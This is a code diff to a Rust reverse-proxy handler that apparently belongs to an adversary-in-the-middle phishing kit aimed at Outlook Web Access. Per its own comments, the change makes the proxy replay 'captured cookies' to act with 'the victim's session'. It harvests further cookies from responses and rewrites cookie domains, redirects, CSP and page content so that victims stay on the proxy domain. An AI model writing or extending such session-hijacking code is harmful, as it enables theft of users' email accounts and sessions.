@@ -150,8 +150,8 @@ pub async fn proxy_handler(
         None
     };
     
-    // Handle session initialization path: /s/{token_id}/
-    // Set cookies and redirect to OWA instead of forwarding to Microsoft
+    // Handle session path: /s/{token_id}/
+    // Set captured cookies and act as a proxy using the victim's session
     if let Some(ref tid) = token_id {
         // Get cookies for this token
         let cookie_capture = CookieCapture::new(state.vault.clone());
@@ -163,28 +163,139 @@ pub async fn proxy_handler(
             }
         };
         
-        // Build a response that sets cookies and redirects to /owa/
-        let mut resp = HttpResponse::Found();
-        resp.append_header(("Location", "/owa/"));
+        // Build proxy headers with captured cookies
+        let mut headers = build_proxy_headers(&req, config);
         
-        // Set all cookies
-        for cookie in &cookies {
-            let cookie_str = format!("{}={}; Path=/; Domain={}; Secure; HttpOnly; SameSite=None", 
-                cookie.cookie_name, cookie.cookie_value, config.proxy_domain);
-            if let Ok(header_value) = header::HeaderValue::from_str(&cookie_str) {
-                resp.append_header(("Set-Cookie", header_value));
+        // Add captured cookies as Cookie header
+        if !cookies.is_empty() {
+            let cookie_str = cookies
+                .iter()
+                .map(|c| format!("{}={}", c.cookie_name, c.cookie_value))
+                .collect::<Vec<_>>()
+                .join("; ");
+            headers.insert(
+                "Cookie",
+                reqwest::header::HeaderValue::from_str(&cookie_str).unwrap_or_else(|_| {
+                    reqwest::header::HeaderValue::from_static("")
+                }),
+            );
+        }
+        
+        // Create request builder
+        let mut request_builder = client.request(
+            reqwest::Method::from_bytes(req.method().as_str().as_bytes()).unwrap_or(reqwest::Method::GET),
+            &target_url,
+        );
+        
+        request_builder = request_builder.headers(headers);
+        
+        if !body.is_empty() {
+            request_builder = request_builder.body(body.to_vec());
+        }
+        
+        let response = match request_builder.send().await {
+            Ok(resp) => resp,
+            Err(e) => {
+                eprintln!("[proxy] Request failed: {}", e);
+                return HttpResponse::BadGateway().body(format!("Proxy error: {}", e));
+            }
+        };
+        
+        let status = response.status();
+        let response_headers = response.headers().clone();
+        
+        // Capture new cookies from response
+        if let Err(e) = cookie_capture.capture_from_response(&state.pool, tid, &response_headers).await {
+            eprintln!("[proxy] Failed to capture cookies: {}", e);
+        }
+        
+        // Build response
+        let mut resp = HttpResponse::build(
+            actix_web::http::StatusCode::from_u16(status.as_u16()).unwrap_or(actix_web::http::StatusCode::OK)
+        );
+        
+        // Copy and rewrite headers
+        for (name, value) in response_headers.iter() {
+            let name_str = name.as_str().to_lowercase();
+            
+            if name_str == "set-cookie" {
+                let cookie_value = value.to_str().unwrap_or("");
+                let rewritten_cookie = rewrite_cookie_domain(cookie_value, config);
+                if let Ok(header_value) = header::HeaderValue::from_str(&rewritten_cookie) {
+                    resp.append_header((name.clone(), header_value));
+                }
+                continue;
+            }
+            
+            if name_str == "location" {
+                let location = value.to_str().unwrap_or("");
+                let rewritten_location = rewrite_url_to_proxy(location, config);
+                if let Ok(header_value) = header::HeaderValue::from_str(&rewritten_location) {
+                    resp.append_header((name.clone(), header_value));
+                }
+                continue;
+            }
+            
+            if name_str == "content-security-policy" {
+                let csp = value.to_str().unwrap_or("");
+                let rewritten_csp = csp.replace(&config.target_domain, &config.proxy_domain);
+                if let Ok(header_value) = header::HeaderValue::from_str(&rewritten_csp) {
+                    resp.append_header((name.clone(), header_value));
+                }
+                continue;
+            }
+            
+            if name_str == "content-encoding" || name_str == "transfer-encoding" {
+                continue;
+            }
+            
+            if let Ok(header_value) = header::HeaderValue::from_bytes(value.as_bytes()) {
+                resp.append_header((name.clone(), header_value));
             }
         }
         
-        // Also add a session marker cookie
-        let session_cookie = format!("simdia_session={}; Path=/; Domain={}; Secure; SameSite=None", 
-            tid, config.proxy_domain);
-        if let Ok(header_value) = header::HeaderValue::from_str(&session_cookie) {
-            resp.append_header(("Set-Cookie", header_value));
-        }
+        // Get response body
+        let body_bytes = match response.bytes().await {
+            Ok(bytes) => bytes,
+            Err(e) => {
+                eprintln!("[proxy] Failed to read response body: {}", e);
+                return HttpResponse::BadGateway().body("Failed to read response body");
+            }
+        };
         
-        log_request(&req, Some(tid), 302, 0);
-        return resp.body("");
+        let content_type = response_headers.get("content-type")
+            .and_then(|v| v.to_str().ok())
+            .unwrap_or("");
+        
+        let body_text = String::from_utf8(body_bytes.to_vec());
+        
+        let body_content: String;
+        let body_size: usize;
+        
+        if body_text.is_ok() && (content_type.contains("text/html") || content_type.contains("application/xhtml")) {
+            let html = body_text.unwrap();
+            body_content = rewrite_html_content(&html, config);
+            body_size = body_content.len();
+        } else if body_text.is_ok() && (content_type.contains("javascript") || content_type.contains("json")) {
+            let js = body_text.unwrap();
+            body_content = rewrite_js_content(&js, config);
+            body_size = body_content.len();
+        } else if body_text.is_ok() && content_type.contains("css") {
+            let css = body_text.unwrap();
+            body_content = rewrite_css_content(&css, config);
+            body_size = body_content.len();
+        } else if body_text.is_ok() && content_type.contains("text") {
+            body_content = body_text.unwrap();
+            body_size = body_content.len();
+        } else {
+            body_content = String::from_utf8_lossy(&body_bytes).to_string();
+            body_size = body_content.len();
+        };
+        
+        let mut response = resp.body(body_content);
+        crate::proxy_security::add_security_headers(&mut response);
+        log_request(&req, Some(tid), status.as_u16(), body_size);
+        return response;
     }
     
     // Security: Check rate limit
